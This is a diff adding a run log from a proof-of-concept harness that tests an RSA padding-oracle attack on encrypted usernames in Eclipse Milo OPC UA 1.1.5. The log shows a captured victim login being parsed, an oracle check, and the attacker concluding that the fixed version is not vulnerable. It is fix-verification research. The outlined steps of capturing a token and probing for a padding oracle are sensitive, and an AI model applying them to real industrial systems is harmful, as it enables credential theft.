@@ -1,0 +1,41 @@
+==> Using /Users/abhinavagarwal/.local/share/mise/installs/java/temurin-17.0.19+10/bin/java (openjdk version "17.0.19" 2026-04-21)
+==> Building against org.eclipse.milo:*:1.1.5 ...
+==> Shaded jar: /Users/abhinavagarwal/Documents/work/milo-security-poc/username-token-padding-oracle/poc/target/padding-oracle-poc.jar
+    milo.version=1.1.5  sha256=475935f065bca244f2c993e682e78b34cb3ae133f68a38dd41e220fc43be0eb0
+==> Working directory: /var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.aSPqaT
+==> Generated a random victim password at runtime (not printed; not a source constant; length=20)
+==> [1/5] Starting server ...
+    server port=32470, cert SHA-256=cf98971287c71fa7e923585298f425bc78a0e20ceee7b6db3c41c6045520c456
+==> [2/5] Starting recording relay (dumb pipe -- no protocol parsing) ...
+    relay listening on localhost:59362
+==> [3/5] Running victim through the relay ...
+[main] INFO poc.common.TcpRecordingProxy - Recording relay listening on localhost:59362 -> localhost:32470
+RELAY_LISTENING port=59362
+[main] INFO poc.RelayMain - [relay] listening on localhost:59362 -> localhost:32470 (dumb pipe -- no protocol parsing)
+[main] INFO poc.RelayMain - [relay] recorded 1883 client->server bytes, 4048 server->client bytes (raw, unparsed)
+CAPTURE_WRITTEN c2sFile=/var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.aSPqaT/capture-c2s.raw s2cFile=/var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.aSPqaT/capture-s2c.raw c2sBytes=1883 s2cBytes=4048
+==> Isolation self-check: raw capture files do not contain the victim password (verified by grep)
+==> [4/5] Running attacker (parses the raw capture itself; checkpointed; resumes across attempts) ...
+    --- attacker attempt 1/40 (max-runtime=90s) ---
+[*] Live server certificate SHA-256: cf98971287c71fa7e923585298f425bc78a0e20ceee7b6db3c41c6045520c456
+[main] INFO poc.AttackerMain - [*] Parsing raw capture ourselves: 1883 client->server bytes from /var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T/padding-oracle-poc.aSPqaT/capture-c2s.raw
+[main] INFO poc.common.WireCodec -   decoded ActivateSessionRequest on wire: policyId=username_rsa15, user=victim, encAlg=http://www.w3.org/2001/04/xmlenc#rsa-1_5, password ct = 256 bytes
+[main] INFO poc.AttackerMain - [*] Extracted the server certificate presented during the captured session from the raw server->client bytes ourselves; SHA-256=cf98971287c71fa7e923585298f425bc78a0e20ceee7b6db3c41c6045520c456
+[*] Extracted from capture: username=victim, policyId=username_rsa15
+[main] INFO poc.AttackerMain - [*] Extracted ciphertext SHA-256: 9910de0498f94d272374bbe45afa68188898bcb8f357efb00b053fc8b0e71c35
+[*] Captured token SHA-256: 9910de0498f94d272374bbe45afa68188898bcb8f357efb00b053fc8b0e71c35
+[+] Basic128Rsa15 username policy found
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Java version: 17.0.19
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Stack version: dev
+[main] INFO org.eclipse.milo.opcua.sdk.client.OpcUaClient - Eclipse Milo OPC UA Client SDK version: dev
+[main] INFO poc.AttackerMain - oracle-confirm: valid-padding/wrong-password -> 0x80200000 (StatusCode[name=Bad_IdentityTokenInvalid, value=0x80200000, quality=bad]); invalid-padding/random -> 0x80200000 (StatusCode[name=Bad_IdentityTokenInvalid, value=0x80200000, quality=bad])
+[-] Server response is UNIFORM for valid- and invalid-padding ciphertexts (both -> 0x80200000 (StatusCode[name=Bad_IdentityTokenInvalid, value=0x80200000, quality=bad])). Target does NOT appear vulnerable; refusing to attempt recovery.
+==> [5/5] Verifying (only this step ever compares recovered-vs-actual) ...
+[+] Attacker correctly reported the target as NOT VULNERABLE and refused to attempt recovery.
+
+Captured one encrypted OPC UA login
+Fixed 1.1.5: ORACLE CLOSED
+
+==> Environment: Darwin 24.6.0 arm64, openjdk version "17.0.19" 2026-04-21
+==> Run directory retained at: /var/folders/xv/18hn328x45v_twcfshgj_s5m0000gn/T//padding-oracle-poc.aSPqaT
+==> exit 4: oracle closed / not vulnerable -- refused to attempt recovery
